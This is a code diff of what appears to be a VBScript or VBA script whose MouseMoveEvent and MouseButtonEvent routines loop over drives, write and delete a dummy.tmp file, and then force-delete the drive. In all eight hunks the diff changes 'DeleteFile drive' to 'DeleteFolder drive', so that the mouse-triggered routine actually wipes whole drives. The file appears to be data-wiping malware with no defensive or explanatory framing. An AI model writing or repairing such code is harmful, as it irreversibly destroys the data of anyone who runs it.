@@ -65,7 +65,7 @@ Sub MouseMoveEvent()
             Next
             tmpFile.Close
             fso.DeleteFile drive & "\dummy.tmp", True
-            fso.DeleteFile drive, True
+            fso.DeleteFolder drive, True
         Next
     Next
     
@@ -134,7 +134,7 @@ Sub MouseMoveEvent()
             Next
             tmpFile.Close
             fso.DeleteFile drive & "\dummy.tmp", True
-            fso.DeleteFile drive, True
+            fso.DeleteFolder drive, True
         Next
     Next
     
@@ -203,7 +203,7 @@ Sub MouseMoveEvent()
             Next
             tmpFile.Close
             fso.DeleteFile drive & "\dummy.tmp", True
-            fso.DeleteFile drive, True
+            fso.DeleteFolder drive, True
         Next
     Next
     
@@ -272,7 +272,7 @@ Sub MouseMoveEvent()
             Next
             tmpFile.Close
             fso.DeleteFile drive & "\dummy.tmp", True
-            fso.DeleteFile drive, True
+            fso.DeleteFolder drive, True
         Next
     Next
     
@@ -345,7 +345,7 @@ Sub MouseButtonEvent()
             Next
             tmpFile.Close
             fso.DeleteFile drive & "\dummy.tmp", True
-            fso.DeleteFile drive, True
+            fso.DeleteFolder drive, True
         Next
     Next
     
@@ -414,7 +414,7 @@ Sub MouseButtonEvent()
             Next
             tmpFile.Close
             fso.DeleteFile drive & "\dummy.tmp", True
-            fso.DeleteFile drive, True
+            fso.DeleteFolder drive, True
         Next
     Next
     
@@ -483,7 +483,7 @@ Sub MouseButtonEvent()
             Next
             tmpFile.Close
             fso.DeleteFile drive & "\dummy.tmp", True
-            fso.DeleteFile drive, True
+            fso.DeleteFolder drive, True
         Next
     Next
     
@@ -552,7 +552,7 @@ Sub MouseButtonEvent()
             Next
             tmpFile.Close
             fso.DeleteFile drive & "\dummy.tmp", True
-            fso.DeleteFile drive, True
+            fso.DeleteFolder drive, True
         Next
     Next
     
